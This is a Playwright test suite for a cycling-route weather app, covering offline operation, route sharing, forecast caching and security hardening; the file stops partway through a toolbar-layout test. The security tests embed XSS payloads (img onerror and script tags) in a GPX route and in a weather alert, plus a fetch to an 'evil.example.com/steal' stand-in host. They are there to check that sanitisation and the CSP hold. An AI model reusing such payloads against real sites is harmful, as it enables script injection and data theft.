import { readFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { expect, test } from '@playwright/test';
import { findRemoteAssets } from '../scripts/build-www.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURE = join(HERE, 'fixtures/route.gpx');
const WWW = join(HERE, '../www');
const PUBLIC = join(HERE, '../../public');

/** Nothing but the app's own origin. This is what the native app really has when
 *  the phone is out of coverage, and what App Store review expects. */
async function goOffline(page) {
  await page.route('**/*', (route) => {
    const url = route.request().url();
    return url.startsWith('http://127.0.0.1') ? route.continue() : route.abort();
  });
}

/** Uncaught exceptions and failed same-origin requests: both mean the bundle is broken. */
function watchForBreakage(page) {
  const crashes = [];
  const missing = [];
  page.on('pageerror', (e) => crashes.push(e.message));
  page.on('response', (r) => {
    if (r.status() >= 400 && r.url().startsWith('http://127.0.0.1')) {
      missing.push(`${r.status()} ${r.url()}`);
    }
  });
  return { crashes, missing };
}

/** The loader swallows its own failures: it logs and shows an alert, so the route
 *  name can still appear while the track failed to reach the map. Watch for both. */
function watchTheLoader(page) {
  const failures = [];
  page.on('dialog', (d) => {
    failures.push(`alert: ${d.message()}`);
    d.dismiss().catch(() => {});
  });
  page.on('console', (m) => {
    if (m.type() !== 'error') return;
    if (/loader outer error|Cannot read properties|cargando GPX|reading GPX/i.test(m.text())) {
      failures.push(m.text());
    }
  });
  return failures;
}

const mapReady = (page) => page.waitForFunction(() => !!window.map, null, { timeout: 15000 });
const routeName = (page) => page.locator('#rutaName');

/** A track actually drawn on the map, not just a file that parsed. Scoped to Leaflet's
 *  overlay pane: the recentre and compass controls are SVG too, so a bare `#map path`
 *  always found something and proved nothing. */
const trackDrawn = (page) => page.locator('#map .leaflet-overlay-pane path');

test('boots with no network at all', async ({ page }) => {
  const { crashes, missing } = watchForBreakage(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Every library the app needs must come from the bundle, not a CDN.
  const globals = await page.evaluate(() => ({
    leaflet: typeof window.L,
    leafletGpx: typeof window.L?.GPX,
    compass: typeof window.L?.Control?.Compass,
    sunCalc: typeof window.SunCalc,
    pako: typeof window.pako,
    toGeoJSON: typeof window.toGeoJSON,
    loader: typeof window.cwLoadGPXFromString,
    injector: typeof window.cwInjectGPXFromText,
  }));
  expect(globals).toEqual({
    leaflet: 'object',
    leafletGpx: 'function',
    compass: 'function',
    sunCalc: 'object',
    pako: 'object',
    toGeoJSON: 'object',
    loader: 'function',
    injector: 'function',
  });

  expect(missing, 'the bundle is missing files').toEqual([]);
  expect(crashes, 'the page threw while booting').toEqual([]);
});

// Not just index.html: marker icons and a donation button were being pulled from
// other sites by the scripts and the help pages, which an offline app cannot do.
test('the bundle fetches no assets from anywhere else', async () => {
  expect(await findRemoteAssets(WWW)).toEqual([]);
  // A payment link outside the store fails App Store review (guideline 3.1.1); the
  // build strips the help pages' donation section and this proves it stayed gone.
  for (const page of ['help.html', 'help_en.html']) {
    const html = await readFile(join(WWW, page), 'utf8');
    expect(html).not.toMatch(/buymeacoffee/i);
    expect(html).not.toMatch(/Apoya el Proyecto|Support the Project/);
    expect(html).toMatch(/Consejo final|Final tip/);   // the section before it survives
  }
});

// Read from public/, not from the bundle: build-www.mjs strips these blocks, so
// asserting over www/ would pass no matter how broken the markup is.
test('structured data parses', async () => {
  const html = await readFile(join(PUBLIC, 'index.html'), 'utf8');
  const blocks = [...html.matchAll(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/g)];
  expect(blocks.length, 'no structured data found at all').toBeGreaterThan(0);
  for (const [, block] of blocks) {
    expect(() => JSON.parse(block)).not.toThrow();
  }
});

test('loads a route from the file picker', async ({ page }) => {
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

/** Every stored recent route as {id, name, bytes}, read straight from IndexedDB. */
const storedRoutes = (page) =>
  page.evaluate(
    () =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('meteoride_recent_routes_db');
        open.onerror = () => reject(open.error);
        open.onsuccess = () => {
          const all = open.result.transaction('routes').objectStore('routes').getAll();
          all.onerror = () => reject(all.error);
          all.onsuccess = () =>
            resolve(
              all.result
                .map((r) => ({ id: r.id, name: r.name, bytes: r.blob ? r.blob.size : 0 }))
                .sort((a, b) => a.id - b.id)
            );
        };
      })
  );

test('opening an older recent route keeps every stored route', async ({ page }) => {
  await goOffline(page);
  const tracks = ['Ruta Uno', 'Ruta Dos', 'Ruta Tres'];
  for (const [i, track] of tracks.entries()) {
    // A fresh page each time: the recent-route name is taken from what is on screen.
    await page.goto('/index.html');
    await mapReady(page);
    const gpx = (await readFile(FIXTURE, 'utf8')).replace('Masnou - Montgat', track);
    await page.locator('#gpxFile').setInputFiles({
      name: `ruta-${i}.gpx`,
      mimeType: 'application/gpx+xml',
      buffer: Buffer.from(gpx),
    });
    await expect.poll(async () => (await storedRoutes(page)).length).toBe(i + 1);
  }

  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().length)).toBe(3);
  const before = await storedRoutes(page);
  expect(before.every((r) => r.bytes > 0)).toBe(true);

  // The oldest one, last in the list.
  const oldest = await page.evaluate(async () => {
    const meta = window.getRecentRoutes().at(-1);
    await window.loadRecentRoute(meta);
    return meta.name;
  });
  expect(oldest).toBe('ruta-0.gpx');
  await expect.poll(() => storedRoutes(page)).toEqual(before);

  // Next cold start: the route just opened comes first, and every route still opens.
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().length)).toBe(3);
  expect(await page.evaluate(() => window.getRecentRoutes()[0].name)).toBe(oldest);
  for (const i of [1, 2, 0]) {
    const text = await page.evaluate(async (name) => {
      window.lastGPXFile = null;
      await window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === name));
      return window.lastGPXFile ? window.lastGPXFile.text() : null;
    }, `ruta-${i}.gpx`);
    expect(text).toContain(tracks[i]);
  }
  await expect.poll(() => storedRoutes(page)).toEqual(before);
});

test('loads a route from ?gpx_url=', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  // Registered after goOffline on purpose: Playwright runs the most recent handler
  // first, so this one wins over the catch-all and serves the fixture from memory.
  await page.route(
    (url) => url.pathname === '/hosted-route.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: gpx })
  );

  await page.goto('/index.html?gpx_url=/hosted-route.gpx&name=Hosted%20route');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

/** Records every message that passes through the notice slot.
 *  There is only one, and the last writer wins, so sampling it at the end of a test
 *  misses a message that appeared and was replaced. */
async function recordNotices(page) {
  await page.addInitScript(() => {
    window.__notices = [];
    const watch = () => {
      const el = document.getElementById('horizonNotice');
      if (!el) return false;
      const push = () => {
        const text = el.textContent.trim();
        if (text && window.__notices[window.__notices.length - 1] !== text) window.__notices.push(text);
      };
      new MutationObserver(push).observe(el, { childList: true, characterData: true, subtree: true });
      push();
      return true;
    };
    if (!watch()) {
      const iv = setInterval(() => { if (watch()) clearInterval(iv); }, 50);
    }
  });
}

/** Stand-in for the bridge Capacitor injects into the web view, implementing the same
 *  MeteoRideShare contract as the iOS and Android plugins. `delayMs` makes a drain slow
 *  enough to collide with a second request, which is the interesting case. */
async function installNativeBridge(page, { routes = [], delayMs = 0, notifications = 'granted', background = 'available' } = {}) {
  await page.addInitScript(
    ({ routes: initial, delayMs: delay, notifications: answer, background: bg }) => {
      const pending = [...initial];
      // What the system will answer when asked for notification permission.
      window.__notifAnswer = answer;
      window.__bgStatus = bg;
      window.__notifAsked = false;
      window.__runnerEvents = [];
      window.__delivered = [];
      window.__enqueue = (route) => pending.push(route);
      window.__prefsRead = () => {
        try { return JSON.parse(sessionStorage.getItem('__prefs') || '{}'); }
        catch (_) { return {}; }
      };
      window.__swRegistered = false;

      const register = navigator.serviceWorker?.register;
      if (register) {
        navigator.serviceWorker.register = function (...args) {
          window.__swRegistered = true;
          return register.apply(navigator.serviceWorker, args);
        };
      }

      const noop = { addListener: async () => ({ remove() {} }) };
      window.Capacitor = {
        isNativePlatform: () => true,
        getPlatform: () => 'ios',
        Plugins: {
          MeteoRideShare: {
            ...noop,
            consumePending: async () => {
              // Snapshot on arrival, like native code reading its inbox: a route that
              // lands while this call is in flight is NOT in this call's answer.
              const next = pending.shift();
              if (delay) await new Promise((r) => setTimeout(r, delay));
              if (next) window.__delivered.push(next.name);
              return next || {};
            },
            backgroundRefreshStatus: async () => ({ status: window.__bgStatus }),
          },
          App: {
            addListener: async (event, cb) => {
              (window.__appListeners = window.__appListeners || {})[event] = cb;
              return { remove() {} };
            },
          },
          StatusBar: { setStyle: async () => {}, setBackgroundColor: async () => {} },
          SplashScreen: { hide: async () => {} },
          // Native storage outlives the page, so the stub is backed by sessionStorage
          // and written through on every set: a reload right after a save must not
          // lose it, which is exactly what the code under test relies on.
          Preferences: {
            get: async ({ key }) => ({ value: (window.__prefsRead() || {})[key] ?? null }),
            set: async ({ key, value }) => {
              const all = window.__prefsRead() || {};
              all[key] = value;
              sessionStorage.setItem('__prefs', JSON.stringify(all));
            },
          },
          Filesystem: {
            writeFile: async (opts) => {
              window.__written = { path: opts.path, directory: opts.directory, data: opts.data };
              return { uri: 'file:///tmp/' + opts.path };
            },
          },
          Share: {
            share: async (opts) => {
              window.__shared = opts;
              return { activityType: 'test' };
            },
          },
          // The background runner's foreground face: the app only ever stores and
          // reads the watch through it. Backed by sessionStorage like Preferences.
          // The key is the name the plugin registers with the bridge, which is NOT
          // its npm export — tests/plugin-names.test.mjs keeps the two in step.
          CapacitorBackgroundRunner: {
            checkPermissions: async () => ({ notifications: sessionStorage.getItem('__notif') || 'prompt' }),
            requestPermissions: async () => {
              window.__notifAsked = true;
              if (!sessionStorage.getItem('__notif')) sessionStorage.setItem('__notif', window.__notifAnswer);
              return { notifications: sessionStorage.getItem('__notif') };
            },
            dispatchEvent: async ({ label, event, details }) => {
              window.__runnerEvents.push({ label, event, details });
              if (event === 'saveWatch') sessionStorage.setItem('__watch', JSON.stringify(details.watch || null));
              if (event === 'loadWatch') return JSON.parse(sessionStorage.getItem('__watch') || 'null');
              return undefined;
            },
          },
          LocalNotifications: {
            createChannel: async (channel) => { window.__channel = channel; },
          },
        },
      };
    },
    { routes, delayMs, notifications, background }
  );
}

test('the native shell hands a shared route to the app', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Shared route.gpx', gpx }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  // The route arrives before initMap runs; injecting too early used to blow up here.
  expect(loaderFailures).toEqual([]);

  expect(await page.evaluate(() => document.documentElement.className)).toContain('cw-native');
  // The plugin replaces the service-worker handoff; registering it would be wrong.
  expect(await page.evaluate(() => window.__swRegistered)).toBe(false);
});

// Both native inboxes take .kml as well as .gpx. The file picker converts KML; a KML
// that came through a share used to go straight to the GPX loader and be refused.
test('a KML shared from another app is converted, not refused', async ({ page }) => {
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`;
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Costa.kml', gpx: kml }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

test('a route arriving mid-drain is not left behind', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  const DELAY = 400;
  await installNativeBridge(page, { delayMs: DELAY });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);

  // The shell drains once at boot. Let that finish, or it swallows the request below
  // and the test stops exercising anything.
  await page.waitForTimeout(DELAY * 2);

  // Drain one route. The drain then asks again, and that second call comes back empty.
  await page.evaluate((text) => {
    window.__enqueue({ name: 'first.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Land the second route while that empty call is still in flight: after it was
  // dispatched and before it resolves. That window is the whole point of the test.
  await page.waitForTimeout(DELAY * 1.5);
  await page.evaluate((text) => {
    window.__enqueue({ name: 'second.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Nothing else will trigger a drain. Only re-running after a request that arrived
  // mid-drain can deliver this one.
  await expect
    .poll(() => page.evaluate(() => window.__delivered), { timeout: 10000 })
    .toEqual(['first.gpx', 'second.gpx']);
  expect(loaderFailures).toEqual([]);
});

// leaflet-gpx concatenates waypoint <name> and <desc> into an HTML popup string, so a
// route is executable content. It reaches the app from a link, from another app's share
// sheet, or from a file — and it would run in the origin holding the provider API key,
// with the Capacitor bridge in reach.
test('a booby-trapped route cannot run script', async ({ page }) => {
  const evil = `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="evil" xmlns="http://www.topografix.com/GPX/1/1">
  <wpt lat="41.479" lon="2.316">
    <name>&lt;img src=x onerror="window.__pwned = 'yes'"&gt;</name>
    <desc>&lt;script&gt;window.__pwned = 'yes'&lt;/script&gt;</desc>
  </wpt>
  <trk><name>Evil</name><trkseg>
    <trkpt lat="41.4790" lon="2.3160"/><trkpt lat="41.4770" lon="2.3050"/>
  </trkseg></trk>
</gpx>`;

  await goOffline(page);
  await page.route(
    (url) => url.pathname === '/evil.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: evil })
  );

  await page.goto('/index.html?gpx_url=/evil.gpx');
  await mapReady(page);
  await expect(trackDrawn(page)).not.toHaveCount(0);

  expect(await page.evaluate(() => window.__pwned), 'the route executed script').toBeUndefined();

  // The waypoint text still reaches the user, as text. leaflet-gpx parses
  // asynchronously and adds waypoints after the track, so poll rather than peek once.
  const readPopups = () =>
    page.evaluate(() => {
      const found = [];
      const walk = (layer) => {
        if (layer.getPopup && layer.getPopup()) found.push(String(layer.getPopup().getContent()));
        if (layer.eachLayer) layer.eachLayer(walk);
      };
      window.map.eachLayer(walk);
      return found;
    });
  await expect
    .poll(async () => (await readPopups()).length, { message: 'no waypoint popup was built', timeout: 10000 })
    .toBeGreaterThan(0);

  for (const html of await readPopups()) {
    expect(html).not.toMatch(/<img|<script/i);
    expect(html).toContain('&lt;img');
  }
});

// Official weather alerts arrive through a provider's API as free text written by
// national met services. That text used to be dropped into innerHTML.
test('a hostile weather alert is shown as text', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const card = await page.evaluate(() => {
    const el = createAlertElement({
      event: '<img src=x onerror="window.__alertPwned = 1"> Warning',
      senderName: '<b>AEMET</b>',
      description: '<script>window.__alertPwned = 1</script> Viento fuerte',
      start: 1700000000,
      end: 1700003600,
    });
    document.body.appendChild(el);
    return {
      text: el.textContent,
      markupElements: el.querySelectorAll('img, script, b').length,
      closeButtons: el.querySelectorAll('button').length,
    };
  });

  // No element was ever created from the text, so nothing could have fired.
  expect(card.markupElements).toBe(0);
  expect(await page.evaluate(() => window.__alertPwned)).toBeUndefined();
  expect(card.text).toContain('Viento fuerte');
  expect(card.text).toContain('AEMET');
  expect(card.closeButtons).toBe(1);
});

// Warnings found along the route belong to the computation and appear when it is
// published, from the per-point lookups as well as from the forecast answers.
test('official warnings found along the route are shown with its forecast', async ({ page }) => {
  const now = Math.floor(Date.now() / 1000);
  await stubProvider(page, { celsius: 20, offline: false });
  await page.route((url) => url.hostname === 'api.openweathermap.org', (route) => route.fulfill({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({ alerts: [{ sender_name: 'AEMET', event: 'Aviso amarillo por viento',
      start: now, end: now + 12 * 3600, description: 'Rachas fuertes' }] }),
  }));
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { document.getElementById('apiKeyOW').value = 'a-valid-looking-key'; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(page.locator('#weather-alerts-container')).toContainText('Aviso amarillo por viento');
});

// The website's policy comes from public/_headers, a Cloudflare file that is stripped
// from the bundle. The app carries its own, and it matters more here: script running
// in the app reaches window.Capacitor.Plugins.
test('the bundle carries its own content security policy', async ({ page }) => {
  for (const name of ['index.html', 'help.html', 'help_en.html']) {
    const html = await readFile(join(WWW, name), 'utf8');
    const meta = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
    expect(meta, `${name} has no CSP`).not.toBeNull();
    const policy = meta[1];
    // 'unsafe-inline' in script-src would give back exactly what the policy is for.
    expect(policy).toMatch(/script-src 'self'\s*;/);
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("base-uri 'self'");
    // A closed connect-src list is what stops a stolen API key from being posted
    // anywhere. The app, unlike the website, never reaches ?gpx_url=, so it can
    // afford to name its hosts. Bare `https:` would give that away.
    expect(policy).toMatch(/connect-src 'self' https:\/\/\S/);
    expect(policy).not.toMatch(/connect-src[^;]*https:(?:\s|;|$)/);
  }

  // It has to actually apply, not merely be present.
  await goOffline(page);
  await page.addInitScript(() => {
    window.__blocked = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__blocked.push(e.violatedDirective));
  });
  await page.goto('/index.html');
  await mapReady(page);

  await page.evaluate(() => {
    document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.__pwned = 1">');
  });
  await page.waitForTimeout(300);

  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(await page.evaluate(() => window.__blocked)).toContain('script-src-attr');

  // And the page cannot talk to a host the policy does not name.
  await page.evaluate(() =>
    fetch('https://evil.example.com/steal', { mode: 'no-cors' }).catch(() => {})
  );
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__blocked)).toContain('connect-src');
});

// Komoot to MeteoRide to a head unit: the app has to be able to pass the route on,
// which means handing a real file to the system share sheet.
test('the app can send the loaded route to another app', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const button = page.locator('#cwShareRoute');
  await expect(button).toHaveCount(1);

  // Nothing loaded yet: it must decline rather than share an empty file or throw.
  await button.click();
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__shared)).toBeFalsy();

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await button.click();

  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();
  const written = await page.evaluate(() => window.__written);
  const shared = await page.evaluate(() => window.__shared);

  // The bytes handed over are the route that was loaded, not a re-rendering of it.
  expect(written.data).toBe(await readFile(FIXTURE, 'utf8'));
  expect(written.directory).toBe('CACHE');
  expect(shared.files).toEqual([`file:///tmp/${written.path}`]);
  expect(written.path).toMatch(/\.gpx$/);
});

// The website must not grow a button that depends on plugins it does not have.
test('the share button exists only in the app', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#cwShareRoute')).toHaveCount(0);
});

// The chain the native build exists for, end to end: a route arrives from another app
// through the share plugin, and goes back out through the share sheet.
test('a route received from another app can be passed on', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  await installNativeBridge(page, { routes: [{ name: 'Komoot tour.gpx', gpx }] });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');

  await page.locator('#cwShareRoute').click();
  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();

  const written = await page.evaluate(() => window.__written);
  // What leaves is the route that came in, under the name the sending app gave it.
  expect(written.data).toBe(gpx);
  expect(written.path).toBe('Komoot tour.gpx');
});

/* ---------- riding without coverage ---------- */

/** A forecast the provider would return, at a temperature we can look for. */
function forecastAt(celsius) {
  const hours = Array.from({ length: 72 }, (_, i) =>
    new Date(Date.now() + i * 3600000).toISOString().slice(0, 13) + ':00'
  );
  const fill = (v) => hours.map(() => v);
  return {
    hourly: {
      time: hours,
      temperature_2m: fill(celsius),
      precipitation: fill(0),
      precipitation_probability: fill(5),
      relative_humidity_2m: fill(60),
      wind_speed_10m: fill(12),
      wind_gusts_10m: fill(20),
      winddirection_10m: fill(180),
      weathercode: fill(1),
      uv_index: fill(3),
      is_day: fill(1),
      cloud_cover: fill(20),
    },
  };
}

/** What the ride watch asks for: several locations at once, unix times, km/h. */
function watchForecast(url, { rain = 0, wind = 10, gust = 15 } = {}) {
  const n = (url.searchParams.get('latitude') || '').split(',').length;
  const base = Math.floor(Date.now() / 3600000) * 3600;
  const time = Array.from({ length: 72 }, (_, i) => base + i * 3600);
  const fill = (v) => time.map(() => v);
  return Array.from({ length: n }, () => ({
    hourly: { time, precipitation: fill(rain), wind_speed_10m: fill(wind), wind_gusts_10m: fill(gust) },
  }));
}

/** Serves the forecast the control object names, or fails the request. */
async function stubProvider(page, control) {
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) => {
      if (control.offline) return route.abort();
      const url = new URL(route.request().url());
      const body = url.searchParams.get('timeformat') === 'unixtime'
        ? watchForecast(url, control.watch)
        : forecastAt(control.celsius);
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });
    }
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
}

const shownTemperatures = (page) =>
  page.evaluate(() =>
    [...document.querySelectorAll('#weatherTable td')]
      .map((c) => c.textContent.trim())
      .filter((t) => /^-?\d+º$/.test(t))
  );

/** Pushes every cached forecast back in time, past the normal 30 minute lifetime. */
const ageTheCache = (page, minutes) =>
  page.evaluate((mins) => {
    for (const key of Object.keys(localStorage)) {
      if (!key.startsWith('cw_weather_')) continue;
      const entry = JSON.parse(localStorage.getItem(key));
      entry.timestamp = Date.now() - mins * 60000;
      localStorage.setItem(key, JSON.stringify(entry));
    }
  }, minutes);

test('an expired forecast is still shown when there is no connection', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // An hour and forty minutes later, out of coverage.
  await ageTheCache(page, 100);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  // The forecast is what was downloaded earlier, and the app says how old it is.
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  expect(await shownTemperatures(page)).toContain('21º');
  await expect(page.locator('.notice')).toContainText('1 h 40 min');
});

test('a stale forecast is never used while the connection works', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Same age as the offline case, but the network is fine: it must refetch.
  await ageTheCache(page, 100);
  control.celsius = 5;
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const shown = await shownTemperatures(page);
  expect(shown, 'the old cached forecast was shown instead of a fresh one').not.toContain('21º');
  expect(shown).toContain('5º');
});

test('preparing a route protects its forecast from being cleared', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);

  // Nothing cached yet: it should say so rather than claim success.
  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Load a route|Carga una ruta/);
  expect(await page.evaluate(() => localStorage.getItem('cw_offline_pinned'))).toBeNull();

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Route saved|Ruta preparada/);

  const pinned = await page.evaluate(() => JSON.parse(localStorage.getItem('cw_offline_pinned') || '[]'));
  expect(pinned.length).toBeGreaterThan(0);
  expect(pinned.every((k) => k.startsWith('cw_weather_'))).toBe(true);
});

// Preparing used to pin every fresh forecast in the cache, whichever route it came from,
// count cache entries as points, and report success even when the pin was not written.
// It has to speak for the route on screen, and only for what it actually secured.
const FOREIGN_KEY = 'cw_weather_openmeteo_2026-01-01_celsius_kmh_10.000_10.000_2026-01-01T10:00:00.000Z';
const plantForeignForecast = (page) =>
  page.evaluate((key) => {
    localStorage.setItem(key, JSON.stringify({ data: { hourly: {} }, timestamp: Date.now() }));
  }, FOREIGN_KEY);
const cachedKeys = (page) =>
  page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith('cw_weather_')));

test('preparing with no route on screen ignores a forecast left from another route', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await plantForeignForecast(page);

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Load a route|Carga una ruta/);
  expect(await page.evaluate(() => localStorage.getItem('cw_offline_pinned'))).toBeNull();
});

test('preparing pins the route on screen, and counts its points', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  // Only this route has run, so every entry held now is one of its points. Steps that
  // fall in the same quarter hour at the same place share an entry and count once.
  const routeKeys = await cachedKeys(page);
  await plantForeignForecast(page);

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(new RegExp(`\\(${routeKeys.length} (points|puntos)\\)`));
  const pinned = await page.evaluate(() => JSON.parse(localStorage.getItem('cw_offline_pinned') || '[]'));
  expect(pinned.sort()).toEqual(routeKeys.sort());
});

test('preparing says so when only part of the route has a forecast stored', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // One point's entry is gone, as a quota clear-out would leave it.
  const keys = await cachedKeys(page);
  expect(keys.length).toBeGreaterThan(1);
  await page.evaluate((key) => localStorage.removeItem(key), keys[0]);

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(new RegExp(`${keys.length - 1} (of|de) ${keys.length}`));
  await expect(page.locator('.notice')).not.toContainText(/Route saved|Ruta preparada\./);
});

test('preparing says so when the protection could not be written', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  await page.evaluate(() => {
    const setItem = Storage.prototype.setItem;
    Storage.prototype.setItem = function (key, value) {
      if (key === 'cw_offline_pinned') throw new DOMException('full', 'QuotaExceededError');
      return setItem.call(this, key, value);
    };
  });

  await page.locator('#cwPrepareOffline').click();
  await expect(page.locator('.notice')).toContainText(/Could not|No se ha podido/);
});

// Picking a file used to start the forecast three times: bindUIEvents and initUI both
// listened to the input, and initUI ran twice, on script load and on DOMContentLoaded.
// The three runs wrote into the one weatherData, so every step landed in it three times.
test('picking a route file computes its forecast once', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  // Only the latest run publishes now, so the table and weatherData look right however
  // many runs a pick starts. Count the launches themselves. segmentRouteByTime calls
  // fetchWeatherForSteps as a global, which resolves through this window property.
  await page.evaluate(() => {
    window.__launches = { reloadFull: 0, fetchWeatherForSteps: 0 };
    for (const name of Object.keys(window.__launches)) {
      const real = window[name];
      window[name] = function (...args) { window.__launches[name]++; return real.apply(this, args); };
    }
  });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  // The extra runs started within milliseconds of the first; half a second is ample
  // for any of them to have been launched.
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => window.__launches)).toEqual({ reloadFull: 1, fetchWeatherForSteps: 1 });
  const times = await page.evaluate(() => window.weatherData.map((s) => +new Date(s.time)));
  expect(times.length).toBeGreaterThan(0);
  expect(new Set(times).size, 'the same step was computed more than once').toBe(times.length);
});

// Two app-only buttons pushed the toolbar onto a second line at phone width. Any
// future one should fail here rather than in a screenshot nobody takes.
test('the app toolbar stays on one line', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Buttons differ in height, so their top edges do not line up even on one row.
  // A wrapped toolbar is taller than its tallest button; an unwrapped one is not.
